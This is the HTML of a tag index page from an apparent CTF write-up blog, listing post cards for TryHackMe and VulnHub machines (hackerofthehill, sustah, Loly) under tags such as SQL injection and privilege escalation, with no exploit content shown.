+    <!-- Tags -->  
+    
+                    
+    <a class="smoothscroll badge badge-primary text-capitalize" href="/tags#boot2root">boot2root</a>               
+                    
+    <a class="smoothscroll badge badge-primary text-capitalize" href="/tags#cracking">cracking</a>               
+                    
+    <a class="smoothscroll badge badge-primary text-capitalize" href="/tags#custom-exploitation">custom exploitation</a>               
+                    
+    <a class="smoothscroll badge badge-primary text-capitalize" href="/tags#enumeration">enumeration</a>               
+                    
+    <a class="smoothscroll badge badge-primary text-capitalize" href="/tags#medium-box">medium-box</a>               
+                    
+    <a class="smoothscroll badge badge-primary text-capitalize" href="/tags#privilage-escalation">privilage escalation</a>               
+                    
+    <a class="smoothscroll badge badge-primary text-capitalize" href="/tags#reversing-binary">reversing binary</a>               
+                    
+    <a class="smoothscroll badge badge-primary text-capitalize" href="/tags#sql-injection">sql injection</a>               
+    
+
+    </div>
+
+    
+    
+    
+    <div class="blog-grid-container">
+        
+        
+            
+            
+        
+            
+        
+            
+            <!-- begin post -->
+
+
+<div class="blog-grid-item">
+    <div class="card h-100">
+        <div class="maxthumb">
+            <a href="/writeup-hackerofthehill/">
+                
+
+                    
+                        <img class="img-thumb" src="/assets/thm_hackerofthehill/bg.png" alt="Tryhackme hackerofthehill"> 
+                    
+
+                
+            </a>
+        </div>
+        <div class="card-body">
+            <h2 class="card-title">
+                <a class="text-dark" href="/writeup-hackerofthehill/">Tryhackme hackerofthehill</a>
+                
+                <div class="mb-2 mt-2 font-weight-normal">
+                <div class="rating-holder">
+<div class="c-rating c-rating--regular" data-rating-value="4.5">
+  <button>1</button>
+  <button>2</button>
+  <button>3</button>
+  <button>4</button>
+  <button>5</button>
+</div>
+</div>
+                </div>
+                
+            </h2>
+            <h4 class="card-text">Introduction This is partical room from tryhackme entitled hackerofthehill with 3 difficulty like easy, Medium ,Hard. For submitted any flag to the hackerone platform, we can get private bug bounty...</h4>
+        </div>
+        <div class="card-footer bg-white">
+            <div class="wrapfooter">
+                
+                <span class="meta-footer-thumb">
+                
+                <img class="author-thumb" src="/assets/img/p.png" alt="Razor-Admin">
+                
+                </span>
+                <span class="author-meta">
+                <span class="post-name font-weight-bold">Razor-Admin</span> 
+                
+                <span class="post-date">11 Mar 2021</span>
+                </span>
+                <div class="clearfix"></div>
+            </div>
+        </div>
+    </div>
+</div>
+<!-- end post -->
+            
+            
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+            <!-- begin post -->
+
+
+<div class="blog-grid-item">
+    <div class="card h-100">
+        <div class="maxthumb">
+            <a href="/writeup-tryhackme-sustah/">
+                
+
+                    
+                        <img class="img-thumb" src="/assets/thm_sustah/bg.png" alt="Tryhackme sustah"> 
+                    
+
+                
+            </a>
+        </div>
+        <div class="card-body">
+            <h2 class="card-title">
+                <a class="text-dark" href="/writeup-tryhackme-sustah/">Tryhackme sustah</a>
+                
+            </h2>
+            <h4 class="card-text">Introduction
+</h4>
+        </div>
+        <div class="card-footer bg-white">
+            <div class="wrapfooter">
+                
+                <span class="meta-footer-thumb">
+                
+                <img class="author-thumb" src="/assets/img/p.png" alt="Razor-Admin">
+                
+                </span>
+                <span class="author-meta">
+                <span class="post-name font-weight-bold">Razor-Admin</span> 
+                
+                <span class="post-date">05 Mar 2021</span>
+                </span>
+                <div class="clearfix"></div>
+            </div>
+        </div>
+    </div>
+</div>
+<!-- end post -->
+            
+            
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+            <!-- begin post -->
+
+
+<div class="blog-grid-item">
+    <div class="card h-100">
+        <div class="maxthumb">
+            <a href="/writeup-vulnhub-loly/">
+                
+
+                    
+                        <img class="img-thumb" src="/assets/vulnhub_loly/bg.png" alt="Loly Writeup"> 
+                    
+
+                
+            </a>
+        </div>
+        <div class="card-body">
+            <h2 class="card-title">
+                <a class="text-dark" href="/writeup-vulnhub-loly/">Loly Writeup</a>
+                
+            </h2>
+            <h4 class="card-text">Introduction
+</h4>
+        </div>
+        <div class="card-footer bg-white">
+            <div class="wrapfooter">
+                
+                <span class="meta-footer-thumb">
+                
+                <img class="author-thumb" src="/assets/img/p.png" alt="Razor-Admin">
+                
+                </span>
+                <span class="author-meta">
+                <span class="post-name font-weight-bold">Razor-Admin</span> 
+                
+                <span class="post-date">02 Mar 2021</span>
+                </span>
+                <div class="clearfix"></div>
+            </div>
+        </div>
+    </div>
+</div>
+<!-- end post -->
+            
+            
+                
+        </div>        
+</div>
+
+<!-- Review with LD-JSON, adapt it for your needs if you like, but make sure you test the generated HTML source code first: 
+https://search.google.com/structured-data/testing-tool/u/0/
+================================================== -->
+
+    </div>
+
+    
+    <!-- Newsletter
+    ================================================== -->
+    <div class="newsletter text-center">
+        <span class="h4"><img src="/assets/images/logo.png" class="newsletter-logo" alt="Razor-Sec"> &nbsp; Never miss a <b>story</b> from us, subscribe to our newsletter</span>
+        <form action="https://wowthemes.us11.list-manage.com/subscribe/post?u=8aeb20a530e124561927d3bd8&amp;id=8c3d2d214b" method="post" name="mc-embedded-subscribe-form" class="wj-contact-form validate" target="_blank" novalidate>
+            <div class="mc-field-group d-inline-flex">
+            <input type="email" placeholder="Your e-mail" name="EMAIL" class="required email" id="mce-EMAIL" autocomplete="on" required>
+            <input type="submit" value="Subscribe" name="subscribe" class="heart">
+            </div>
+        </form>
+    </div>
+    
+    
+</div>
+
+<!-- Begin Footer
+================================================== -->
+<footer class="footer">
+    <div class="container">
+        <div class="row">
+            <div class="col-md-6 col-sm-12 text-center text-lg-left">
+                Copyright © 2022 Razor-Sec 
+            </div>
+            <div class="col-md-6 col-sm-12 text-center text-lg-right">    
+                Created by <a target="_blank" href="">Razor-Sec </a> 
+            </div>
+        </div>
+    </div>
+</footer>
+<!-- End Footer
+================================================== -->
+
+</div> <!-- /.site-content -->
+
+<!-- Scripts (if you need bootstrap.js, please add it yourself. I didn't use it for performance reasons, it was not needed in this theme)
+================================================== -->
+
+<script src="/assets/js/prism.js"></script>
+
+<script src="/assets/js/theme.js"></script>
+
+
+
+
+<script id="dsq-count-scr" src="//Demo-RazorSec.disqus.com/count.js"></script>
+
+
+</body>
+</html>
